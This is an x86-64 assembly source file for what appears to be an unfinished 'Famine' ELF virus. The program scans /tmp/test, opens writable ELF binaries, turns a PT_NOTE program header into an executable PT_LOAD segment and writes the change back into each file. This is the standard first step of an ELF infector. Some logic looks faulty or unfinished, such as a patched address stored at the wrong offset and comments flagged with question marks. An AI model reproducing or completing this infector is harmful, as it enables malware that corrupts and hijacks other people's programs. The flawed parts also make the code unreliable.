%define SYS_WRITE		1
%define SYS_OPEN 		2
%define SYS_CLOSE		3
%define SYS_STAT		4
%define SYS_FSTAT		5
%define SYS_LSEEK		8
%define SYS_PREAD64		17
%define SYS_PWRITE64	18
%define SYS_EXIT		60
%define SYS_CHDIR		80
%define SYS_GETDENTS64	217

%define S_IFDIR 0x4000
%define O_RDONLY 00
%define S_IFMT 0xf000

%define FAMINE_STACK_SIZE 5000
%define DIRENT_BUFFSIZE 1024

%define EHDR_SIZE 64
%define PHDR_SIZE 56
%define PT_NOTE	4
%define PT_LOAD 1

%define PF_X 1
%define PF_W 2
%define PF_R 4

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;             BUFFER           ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

; r15 /tmp/test                                     directory /tmp/test name
; r15 + 16 /tmp/test                                directory /tmp/test fd

; r15 + 32 struct stat                              
;	r15 + 32 dev inode_number
;	r15 + 56 stat.st_mode
; 	r15 + 80 stat.st_size

; r15 + 176 struct dirent (sizeof dirent 280)
;	r15 + 176    d_ino       	                    64-bit Inode number.
;	r15 + 184    d_off       	                    64-bit Offset to the next dirent structure.
;	r15 + 192    d_reclen    	                    16-bit Length of this record.
;	r15 + 194    d_type      	                    8-bit File type (DT_REG, DT_DIR, etc.).
;	r15 + 195    d_name      	                    Null-terminated filename.

; r15 + 1300 Ehdr64
; 	🦓 r15 + 1300 = ehdr
; 	🐴 r15 + 1304 = ehdr.class                      ELF class.
; 	🦄 r15 + 1308 = ehdr.pad                        Unused padding for alignment.
; 	🦓 r15 + 1324 = ehdr.entry                      Entry point virtual address.
; 	🐴 r15 + 1332 = ehdr.phoff                      Offset of the program header table.
; 	🦄 r15 + 1354 = ehdr.phentsize                  Size of each program header entry.
; 	🦓 r15 + 1356 = ehdr.phnum                      Number of program header entries.
; 	🐴 r15 + 1364 = phdr.type                       Type of segment (e.g., PT_LOAD, PT_DYNAMIC).
; 	🦄 r15 + 1368 = phdr.flags                      Segment flags (e.g., PF_X, PF_W, PF_R).
; 	🦓 r15 + 1372 = phdr.offset                     Offset of the segment in the file.
; 	🐴 r15 + 1380 = phdr.vaddr                      Virtual address of the segment in memory.
; 	🦄 r15 + 1388 = phdr.paddr                      Physical address of the segment (not used on most systems).
; 	🦓 r15 + 1396 = phdr.filesz                     Size of the segment in the file.
; 	🐴 r15 + 1404 = phdr.memsz                      Size of the segment in memory (may include padding).
; 	🦄 r15 + 1412 = phdr.align                      Alignment of the segment in memory and file

; r15 + 1420 binary_fd                              Actual reading file descriptor

; r15 + 1424 Phdr64
;	r15 + 1424    phdr.p_type                       Type of segment (e.g., PT_LOAD, PT_DYNAMIC).
;	r15 + 1428    phdr.p_flags                      Segment flags (e.g., PF_X, PF_W, PF_R).
;	r15 + 1432    phdr.p_offset                     Offset of the segment in the file.
;	r15 + 1440    phdr.p_vaddr                      Virtual address of the segment in memory.
;	r15 + 1448    phdr.p_paddr                      Physical address of the segment (not used on most systems).
;	r15 + 1456    phdr.p_filesz                     Size of the segment in the file.
;	r15 + 1464    phdr.p_memsz                      Size of the segment in memory (may include padding).
;	r15 + 1472    phdr.p_align                      Alignment of the segment in memory and file.

; r15 + 1484                                        phdr_num counter to iterate over the headers

global _start

section .text
_start:
	S_IRUSR equ 256 ; Owner has read permission
	S_IWUSR equ 128 ; Owner has write permission

	push rbp
	push rdx
	push rsp
	sub  rsp, FAMINE_STACK_SIZE                    ; Reserve some espace in the register r15 to store all the data needed by the program
	mov r15, rsp    

_folder_to_infect:	
	mov qword [r15], '/tmp'
	mov qword [r15 + 4], '/tes'
	mov qword [r15 + 8], 0x00000074                ; assigning /tmp/test to the beginning of the r15 register

	; mov rdi, r15                                 ; ?????????????
	; mov [r15 + 16], rax
	; test rax, rax
	; js _end                                      ; if open fails, exit silently ??

_folder_stat:
	mov rdi, r15
	lea rsi, [r15 + 32]
	mov rax, SYS_STAT
	syscall

_is_dir:
	lea rax, [r15 + 56]
	mov rcx, [rax]
	mov rdx, S_IFDIR
	and rcx, S_IFMT
	cmp rdx, rcx
	jne _end

_diropen:
	mov rdi, r15
	mov rsi, O_RDONLY
	mov rax, SYS_OPEN
	syscall

	test rax, rax                                  ; checking open
	js _end

	mov [r15 + 16], rax                            ; saving /tmp/test open fd

_change_to_dir:                                    ; cd to dir
	lea rdi, [r15]
	mov rax, SYS_CHDIR
	syscall

_dirent_tmp_test:                                  ; getdents the directory to iterate over all the binaries
	mov rdi, [r15 + 16]
	lea rsi, [r15 + 176]
	mov rdx, DIRENT_BUFFSIZE
	mov rax, SYS_GETDENTS64
	syscall

	cmp rax, 0                                     ; no more files in the directory to read
	je _close_folder

	xor r14, r14                                   ; i = 0 for the first iteration
	mov r13, rax                                   ; r13 stores the number of read bytes with getdents
	_dirent_loop:
		movzx r12d, word [r15 + 192 + r14]

	_stat_file:
		lea rdi, [r15 + 195 + r14]                 ; stat over every file
		lea rsi, [r15 + 32]
		mov rax, SYS_STAT
		syscall

	_check_file_flags:                             ; check if if the program can read and write over the binary
		lea rax, [r15 + 56]
		mov rcx, [rax]
		and rcx, S_IRUSR                           ; rcx & S_IRUSR == 1
		test rcx, rcx
		jz _continue_dirent

		lea rax, [r15 + 56]  
		mov rcx, [rax]
		and rcx, S_IWUSR                           ; rcx & S_IWUSR == 1
		test rcx, rcx
		jz _continue_dirent

		lea rax, [r15 + 56]
		mov rcx, [rax]
		mov rdx, S_IFDIR
		and rcx, S_IFMT
		cmp rdx, rcx
		je _continue_dirent                        ; checks if its a directory, if so, jump to the next binary of the dirent

		cmp dword [r15 + 80], 64                   ; checks that the file is at least as big as an ELF header
		jl _continue_dirent

	_open_bin:
		lea rdi, [r15 + 195 + r14]
		mov rsi, 0x0002                            ; O_RDWR 
		mov rdx, 0644o
		mov rax, SYS_OPEN                          ; open ( dirent->d_name, O_RDWR )
		syscall

		mov qword [r15 + 1420], rax                ; save binary fd
		mov rdi, rax                               ; rax contains fd
		lea rsi, [r15 + 1300]                      ; rsi = ehdr
		mov rdx, EHDR_SIZE			               ; ehdr.size
		mov r10, 0                                 ; read at offset 0
		mov rax, SYS_PREAD64
		syscall

	_is_elf:
		cmp dword [r15 + 1300], 0x464c457f         ; check if the file starts with 177ELF what indicates it is an ELF binary
		jne _close_bin


		mov byte [r15 + 1484], 0                   ; i = 0, iterate over all ELF program headers
		_read_phdr:
			mov word r9w, [r15 + 1484]
			cmp word [r15 + 1356], r9w
			je _close_bin                          ; check if all the headers have been read

			lea rsi, [r15 + 1424]
			mov rdx, PHDR_SIZE
			mov r10, [r15 + 1484]
			imul r10, r10, PHDR_SIZE
			add r10, EHDR_SIZE
			mov rax, SYS_PREAD64
			syscall

			cmp word [r15 + 1424], PT_NOTE         ; phdr->type
			jne _next_phdr                         ; if it is not a PT_NOTE header, continue to check the next one

		_change_ptnote_to_ptload:
			mov dword [r15 + 1424], PT_LOAD        ; change PT_NOTE header to PT_LOAD

		_change_mem_protections:
			mov dword [r15 + 1428], PF_R | PF_X    ; disable memory protections

		_adjust_mem_vaddr:
			mov r9, [r15 + 80]
			add r9, 0xc000000
			mov [r15 + 1380], r9				   ; patch phdr.vaddr

		_write_header_changes_to_bin:              ; writes new header modifications to the binary
			mov rdi, [r15 + 1420]
			lea rsi, [r15 + 1424]
			mov rdx, PHDR_SIZE
			; mov r10, r10 ????????
			mov rax, SYS_PWRITE64
			syscall

			jmp _close_bin

		_next_phdr:
			inc word [r15 + 1484]
			jmp _read_phdr

	_close_bin:
		mov qword rdi,[ r15 + 1420]
		mov rax, SYS_CLOSE
		syscall

	_continue_dirent:
		add r14, r12
		cmp r14, r13
		jne _dirent_loop                           ; if it has still files to read continues to the next one
		jmp _dirent_tmp_test                       ; else, do the getdents again

_close_folder:
	mov rdi, [r15 + 16]
	mov rax, SYS_CLOSE
	syscall

_end:
	add rsp, FAMINE_STACK_SIZE
	pop rsp
	pop rdx
	mov rax, SYS_EXIT
	xor rdi, rdi
	syscall
